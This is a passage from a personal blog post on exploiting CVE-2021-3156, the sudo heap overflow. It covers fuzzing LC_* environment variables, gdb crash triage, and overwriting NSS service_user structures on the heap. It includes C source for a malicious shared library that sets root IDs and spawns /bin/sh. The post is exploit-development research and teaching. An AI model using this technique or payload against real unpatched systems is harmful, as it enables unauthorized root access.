            <span class="n">strcat</span><span class="p">(</span><span class="n">LC_ALL_</span><span class="p">,</span> <span class="n">rand_str</span><span class="p">(</span><span class="n">MAX_LEN_LC</span><span class="p">,</span> <span class="mi">1</span><span class="p">));</span>
            <span class="n">env</span><span class="p">[</span><span class="n">nbr_env</span><span class="o">-</span><span class="n">LC_count</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">LC_ALL_</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="n">rand</span><span class="p">()){</span>
            <span class="n">LC_MEASUREMENT_</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">MAX_LEN</span><span class="o">+</span><span class="mi">28</span><span class="p">);</span>
            <span class="n">strncpy</span><span class="p">(</span><span class="n">LC_MEASUREMENT_</span><span class="p">,</span> <span class="s">"LC_MEASUREMENT=en_US.UTF-8"</span><span class="p">,</span> <span class="mi">26</span><span class="p">);</span>
            <span class="n">LC_MEASUREMENT_</span><span class="p">[</span><span class="mi">26</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
            <span class="n">strcat</span><span class="p">(</span><span class="n">LC_MEASUREMENT_</span><span class="p">,</span> <span class="n">rand_str</span><span class="p">(</span><span class="n">MAX_LEN_LC</span><span class="p">,</span> <span class="mi">1</span><span class="p">));</span>
            <span class="n">env</span><span class="p">[</span><span class="n">nbr_env</span><span class="o">-</span><span class="n">LC_count</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">LC_MEASUREMENT_</span><span class="p">;</span>
        <span class="p">}</span>
		<span class="c1">// And so on for other LC variables</span>
</pre></table></code></div></div><p>I let it run overnight and woke up to thousands of crashes which made it impossible to inspect each one manually.</p><h2 id="crash-triaging">Crash triaging</h2><hr /><p>To triage all those crash reports, I wrote a wrapper that reads the parameters we saved from a file and reproduces the crash.</p><p>I used this gdb script to dump the state of the program at time of crash.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>#gdb_triage_script
r
bt
i r
x/10i $rip
quit
</pre></table></code></div></div><p>And ran all the crash reports through this using a bash loop.</p><p><code class="language-plaintext highlighter-rouge">for crash in crash_* ; do /usr/bin/sudo gdb -q -x ./gdbtriage.init --args ./wrapper $crash &gt; triage_$crash; done</code></p><p>Here is an example of a set of parameters and its associated debug information.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/triage.png" alt="sudo" /> <em>Example of a crash report</em></p><p>This allowed me to easily look for interesting crashes :</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/interesting.png" alt="sudo" /> <em>Greping for crashes that happened inside load_library</em></p><h2 id="exploitation">Exploitation</h2><hr /><p>I am sure many of the crashes found were exploitable, but while reading through the crash reports, I did recognize one of the options mentionned in the original Qualys article so this is where I concentrated my efforts.</p><p>Here is the idea:</p><p>To work correctly in the local environment, sudo uses a GLibc feature called <a href="https://www.gnu.org/software/libc/manual/html_node/Name-Service-Switch.html">Name Service Switch (NSS)</a>. This is how it gets access to group information, passwd and shadow file, sudoers policy etc.</p><p>Some structures are maintened on the heap, for the different services offered by NSS and the libraries they rely upon (if one is used). They take the form of a linked list on the heap starting from the <code class="language-plaintext highlighter-rouge">service_table</code> object.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/NSS.png" alt="sudo" /> <em>name_database_entry structs on the heap</em></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/nss_lib.png" alt="sudo" /> <em>service_user structs on the heap</em></p><p>If we were to overflow into one of those structures and write the name of a library we control, when the program attempts to use it, our code will get executed instead. A major advantage of this method is that is bypasses ASLR since we just provide the name of the .so file we want to load. Let’s write a simple shared library that spawns a shell when loaded :</p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span> 
<span class="k">static</span> <span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="n">_init</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
 
<span class="k">static</span> <span class="kt">void</span> <span class="nf">_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
    <span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
    <span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
    <span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
    <span class="k">static</span> <span class="kt">char</span> <span class="o">*</span><span class="n">arg</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
    <span class="n">execv</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="n">arg</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Now let’s inspect the heap layout at time of crash.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/bad_heap.png" alt="sudo" /></p><p>Unfortunately, in this crash, our chunk at 0x555555582990 comes after the target service_user struct (which contains the library name) )which is at 0x55555557c340. Therefore, we can’t overflow into it.</p><p>There are 3 possible ordering of the relevant objects on the heap : (As a reminder user_args is the chunk we control and service_user is the target.)</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>                                                               Low addresses
       (1)                     (2)                     (3)           |
 +-------------+    |    +-------------+    |    +-------------+     |
 |service_table|    |    |service_table|    |    |  user_args  |     |
 +-------------+    |    +-------------+    |    +-------------+     V
                    |                       | 
 +-------------+    |    +-------------+    |    +-------------+
 |service_user |    |    |  user_args  |    |    |service_table|
 +-------------+    |    +-------------+    |    +-------------+
                    |                       | 
 +-------------+    |    +-------------+    |    +-------------+
 |  user_args  |    |    |service_user |    |    |service_user |
 +-------------+    |    +-------------+    |    +-------------+
                    |                       |
 We are past our    |      Perfect!!        |    We corrupt 
 target.            |                       |    the service_table
 Nothing to         |                       |    on our way to 
 overwrite.         |                       |    service_user which
                    |                       |    causes a premature
                    |                       |    crash. 
</pre></table></code></div></div><p>Thankfully I had collected a ton of crashes with all sorts of heap layouts through fuzzing. I selected the shortest one that had configuration (2).</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/target.png" alt="sudo" /></p><p>And after a lot of trial and error, I managed to overwrite the library name with “X/X”. (To comply with the naming convention used by NSS the library is called libnss_X/X.so.2.)</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/success.png" alt="sudo" /></p><p>There are a few more hoops we need to jump through like inserting null bytes at the right spot to prevent early crashes but I won’t go into the details.</p><p>Here is the final result : <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sudo/final.png" alt="sudo" /></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/exploit-development/'>Exploit development</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/exploits/" class="post-tag no-text-decoration" >Exploits</a> <a href="/tags/cve/" class="post-tag no-text-decoration" >CVE</a> <a href="/tags/heap/" class="post-tag no-text-decoration" >Heap</a> <a href="/tags/overflow/" class="post-tag no-text-decoration" >overflow</a> <a href="/tags/sudo/" class="post-tag no-text-decoration" >sudo</a> <a href="/tags/cve-2021-3156/" class="post-tag no-text-decoration" >CVE-2021-3156</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Exploiting CVE-2021-3156 (sudo heap overflow) - RAC Blog&url=https://Richard-AC.github.io/posts/sudo-cve/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Exploiting CVE-2021-3156 (sudo heap overflow) - RAC Blog&u=https://Richard-AC.github.io/posts/sudo-cve/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Exploiting CVE-2021-3156 (sudo heap overflow) - RAC Blog&url=https://Richard-AC.github.io/posts/sudo-cve/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/rdbg/">rdbg - A Rust library for writing custom Windows debuggers</a><li><a href="/posts/fuzzing-brava/">Fuzzing Closed-Source Windows Programs</a><li><a href="/posts/old_page/">My portfolio</a><li><a href="/posts/SEH/">Clearing up Windows SEH exploitation</a><li><a href="/posts/sudo-cve/">Exploiting CVE-2021-3156 (sudo heap overflow)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/debugging/">Debugging</a> <a class="post-tag" href="/tags/exploits/">Exploits</a> <a class="post-tag" href="/tags/reverse-engineering/">Reverse Engineering</a> <a class="post-tag" href="/tags/archive/">archive</a> <a class="post-tag" href="/tags/automation/">Automation</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/cve-2021-3156/">CVE-2021-3156</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/fuzzing/">Fuzzing</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/SEH/"><div class="card-body"> <span class="timeago small" > Jan 6, 2021 <i class="unloaded">2021-01-06T19:33:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Clearing up Windows SEH exploitation</h3><div class="text-muted small"><p> Introduction SEH is an exception handling mechanism used in Windows programs which has been abused by exploit writers for years. This Corelan article gives a good introduction to SEH and present...</p></div></div></a></div><div class="card"> <a href="/posts/NORZH-sidechannel/"><div class="card-body"> <span class="timeago small" > May 25, 2021 <i class="unloaded">2021-05-25T19:33:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CTF Writeup - NorzhCTF - S1de Ch4nnel</h3><div class="text-muted small"><p> Introduction S1de Ch4nnel was a challenge at NorzhCTF 2021. You can download the challenge here and my commented solution there. Challenge presentation When we ssh into the machine we are ...</p></div></div></a></div><div class="card"> <a href="/posts/rdbg/"><div class="card-body"> <span class="timeago small" > Feb 27 <i class="unloaded">2023-02-27T08:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>rdbg - A Rust library for writing custom Windows debuggers</h3><div class="text-muted small"><p> rdbg on Github Introduction Writing a custom debugger can be very useful for many program analysis tasks. MSDN provides a useful template which I ended up using many times including in my Triage...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SEH/" class="btn btn-outline-primary"><p>Clearing up Windows SEH exploitation</p></a> <a href="/posts/NORZH-sidechannel/" class="btn btn-outline-primary"><p>CTF Writeup - NorzhCTF - S1de Ch4nnel</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Richard AC</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/debugging/">Debugging</a> <a class="post-tag" href="/tags/exploits/">Exploits</a> <a class="post-tag" href="/tags/reverse-engineering/">Reverse Engineering</a> <a class="post-tag" href="/tags/archive/">archive</a> <a class="post-tag" href="/tags/automation/">Automation</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/cve-2021-3156/">CVE 2021 3156</a> <a class="post-tag" href="/tags/cve/">CVE</a> <a class="post-tag" href="/tags/fuzzing/">Fuzzing</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script> <script> $(function() { let initTheme = "default"; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches ) ) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Markdown converts to HTML */ $("pre").has("code.language-mermaid").each(function() { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<div class=\"mermaid\">${svgCode}</div>`); }); mermaid.initialize(mermaidConf); }); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://Richard-AC.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
